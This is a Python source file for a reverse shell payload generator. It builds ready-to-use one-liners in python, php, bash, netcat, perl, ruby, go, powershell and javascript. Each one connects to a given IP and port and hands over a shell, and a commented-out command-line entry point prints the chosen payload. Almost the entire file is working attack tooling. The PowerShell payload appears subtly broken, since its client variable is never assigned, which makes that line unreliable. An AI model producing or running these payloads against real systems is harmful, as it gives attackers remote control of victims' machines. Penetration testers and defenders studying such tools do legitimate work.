class ReverseShellGenerator:
    def __init__(self, ip, port, language):
        self.ip = ip
        self.port = port
        self.language = language.lower()

    def generate(self):
        ip = self.ip
        port = self.port
        lang = self.language
        
        payloads = {
            "python": f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
            "php": f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            "bash": f"""bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'""",
            "nc": f"""nc -e /bin/sh {ip} {port}""",
            "perl": f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
            "ruby": f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{ip}",{port});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
            "go": f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go run /tmp/shell.go""",
            "powershell": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
            "javascript": f"""require('child_process').exec('nc -e /bin/sh {ip} {port}')"""
        }

        if lang in payloads:
            green = "\033[92m"
            reset = "\033[0m"
            return green + payloads[lang] + reset
        else:
            red = "\033[91m"
            reset = "\033[0m"
            return f"{red}[-] Unsupported language: {lang}{reset}"




# def main():
#     parser = argparse.ArgumentParser(
#         description="Reverse Shell Payload Generator",
#         formatter_class=argparse.RawTextHelpFormatter
#     )

#     parser.add_argument("-i", "--ip", required=True, help="Target IP address")
#     parser.add_argument("-p", "--port", required=True, help="Target Port")
#     parser.add_argument(
#         "-t", "--type",
#         required=True,
#         help=(
#             "Payload Type:\n"
#             "python | php | bash | nc | perl | ruby | go | powershell | javascript"
#         )
#     )

#     args = parser.parse_args()

#     generator = ReverseShellGenerator(args.ip, args.port, args.type)
#     payload = generator.generate()

#     print(f"\033[96m[*] Reverse shell payload for {args.type}:\033[0m\n")
#     print(payload)


# if __name__ == "__main__":
#     main()
